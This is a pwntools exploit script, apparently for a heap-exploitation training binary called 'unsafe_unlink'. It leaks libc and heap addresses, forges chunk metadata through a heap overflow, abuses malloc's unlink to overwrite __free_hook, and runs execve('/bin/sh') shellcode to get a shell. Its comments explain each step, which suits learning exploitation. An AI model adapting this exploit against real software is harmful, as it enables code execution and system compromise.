#!/usr/bin/env python2.7


from pwn import *

BINARY = './unsafe_unlink'
LIBC = './libc.so.6'
ADDR = 'localhost'
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)

# Global index variable to keep track of allocated chunks
INDEX = 0


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    if args.PWNDBG:
        context.log_level = 'debug'
        context.terminal = ['tmux', 'splitw', '-h']
        return gdb.debug(elf.path, gdbscript='''init-pwndbg''')

    else:
        return remote(ADDR, PORT)


def malloc(io, size):
    global INDEX

    io.send("1")
    io.sendafter("size: ", str(size))
    io.recvuntil("> ")

    INDEX += 1
    return (INDEX - 1)


def edit(io, index, data):
    io.send("2")
    io.sendafter("index: ", str(index))
    io.sendafter("data: ", data)
    io.recvuntil("> ")


def free(io, index):
    io.send("3")
    io.sendafter("index: ", str(index))
    io.recvuntil("> ")


def solve():
    io = conn()
    io.timeout = 0.1

    io.recvuntil("puts() @ ")
    libc.address = int(io.recvline(), 16) - libc.sym.puts
    io.recvuntil("heap @ ")
    heap = int(io.recvline(), 16)
    log.info("puts() found at: " + hex(libc.sym.puts))
    log.info("libc base found at: " + hex(libc.address))
    log.info("heap found at: " + hex(heap))
    io.recvuntil("> ")

    """
    Assemble shellcode. We use a label and a jmp instruction because our
    shellcode will be mangled when malloc writes an address into the fd of our
    fake chunk. We're able to execute this shellcode because the NX memory
    protection is not enabled for "unsafe_unlink".
    """
    shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" +
                    shellcraft.execve("/bin/sh"))
    shellcode_address = heap + 0x20

    """
    Request 2 small chunks. A heap overflow exists that allows us to overwrite
    the heap metadata of the chunk below the first chunk, "overflow". We
    overwrite the "victim" chunk's heap metadata to mark the "overflow" chunk
    as freed. When we free the "victim" chunk, the "overflow" chunk is
    consolidated, allowing us to conducted a reflective write. We overwrite the
    __free_hook with the address of our shellcode.
    """
    overflow = malloc(io, 0x88)
    victim = malloc(io, 0x88)

    """
    Prep fake chunk metadata. Set the fd such that the bk of the "chunk" is
    points to is the free hook.
    """
    fd = libc.sym.__free_hook - 0x18
    # Set the bk such that the fd of the "chunk" is points to is the shellcode.
    bk = shellcode_address


    # Set the prev_size field of the next chunk to the actual previous chunk
    # size.
    prev_size = 0x90

    """
    Write the fake chunk metadata to the "overflow" chunk while storing the
    shellcode. Overflow into the succeeding chunk's size field to clear the
    prev_inuse flag.
    """
    payload = [
        fd,
        bk,
        shellcode,
        cyclic(cyclic_find(0x6161686161616161, n=8), n=8),
        prev_size,
        0x90
    ]
    edit(io, overflow, flat(payload))

    # Free the "victim" chunk to trigger malloc's backward consolidation.
    free(io, victim)
    # Free the "overflow" chunk to trigger shellcode.
    free(io, overflow)

    io.interactive()


if __name__ == "__main__":
    solve()
